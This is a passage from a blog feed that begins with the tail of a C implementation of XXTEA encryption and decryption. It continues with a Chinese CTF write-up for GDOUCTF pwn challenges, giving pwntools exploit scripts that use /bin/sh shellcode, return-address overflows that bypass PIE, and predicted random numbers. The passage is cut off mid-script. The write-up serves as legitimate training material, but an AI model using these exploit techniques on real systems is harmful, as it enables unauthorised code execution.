class="token punctuation">)</span><span class="token punctuation">{</span>                        y <span class="token operator">=</span> data<span class="token punctuation">[</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        z <span class="token operator">=</span> data<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                y <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                z <span class="token operator">=</span> data<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> MX<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//解密算法</span><span class="token keyword">void</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>        rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span><span class="token operator">/</span>n<span class="token punctuation">;</span>        sum <span class="token operator">=</span> delta <span class="token operator">*</span> rounds<span class="token punctuation">;</span>        y <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>                e <span class="token operator">=</span> <span class="token punctuation">(</span>sum<span class="token operator">&gt;&gt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        z <span class="token operator">=</span> data<span class="token punctuation">[</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        y <span class="token operator">=</span> data<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                z <span class="token operator">=</span> data<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                y <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>                sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">uint32_t</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密前原始数据：%u, %u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后数据：%u, %u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后原始数据：%u, %u, %u\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TEA、XTEA、XXTEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTF-WP</title>
      <link href="/2023/04/20/gdouctf-wp/"/>
      <url>/2023/04/20/gdouctf-wp/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><ul><li>使用mprotect()函数给bss段赋了rwx权限</li><li>限制shellcode长度小于37个字节</li></ul><blockquote><p>使用小于37字节的shellcode即可</p></blockquote><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment">#io = remote('node3.anna.nssctf.cn', 28729)</span>sh  <span class="token operator">=</span> <span class="token string">b"\x48\x31\xd2"</span>sh <span class="token operator">+=</span> <span class="token string">b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"</span>sh <span class="token operator">+=</span> <span class="token string">b"\x48\xc1\xeb\x08"</span>sh <span class="token operator">+=</span> <span class="token string">b"\x53"</span>sh <span class="token operator">+=</span> <span class="token string">b"\x48\x89\xe7"</span>sh <span class="token operator">+=</span> <span class="token string">b"\x50"</span>sh <span class="token operator">+=</span> <span class="token string">b"\x57"</span>sh <span class="token operator">+=</span> <span class="token string">b"\x48\x89\xe6"</span>sh <span class="token operator">+=</span> <span class="token string">b"\xb0\x3b"</span>sh <span class="token operator">+=</span> <span class="token string">b"\x0f\x05"</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Please.\n'</span><span class="token punctuation">,</span> sh<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'start!\n'</span><span class="token punctuation">,</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0xA</span> <span class="token operator">+</span> <span class="token string">b'deedbeef'</span><span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6010A0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><ul><li>存在后门函数</li><li>开启了PIE保护</li></ul><blockquote><p>覆盖返回地址的低两个字节为后门函数的低两个字节从而绕过PIE</p><p>原理：PIE只会使得低12位随机化</p></blockquote><p>exp1：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span><span class="token comment">#io = remote('node5.anna.nssctf.cn', 28121)</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x1F</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> <span class="token string">b'\xD5\x11'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方解：因为最后是否执行后门函数由v5的值确定的，所以我们可以通过溢出覆盖v5的值为1即可；</p><p><img src="/2023/04/20/gdouctf-wp/1.png"></p><p>exp2：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./easypwn"</span><span class="token punctuation">)</span><span class="token comment">#io = remote('node5.anna.nssctf.cn', 28121)</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1F</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="120"><a href="#120" class="headerlink" title="120"></a>120</h2><ul><li>伪随机数，有三个固定的种子，所以我们每次有三分之一的机会成功</li><li>也可以用cdll模拟</li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bin"</span><span class="token punctuation">)</span><span class="token comment">#io = remote('node2.anna.nssctf.cn', 28623)</span>ans1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>ans2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>ans3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token comment">#cs=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")</span><span class="token comment">#cs.srand(cs.time(0))</span><span class="token comment">#v = cs.rand()</span><span class="token comment">#cs.srand(v%3-1522127470)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ans1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment">#io.sendline(str(cs.rand() % 4 + 1))</span>        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ans2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token 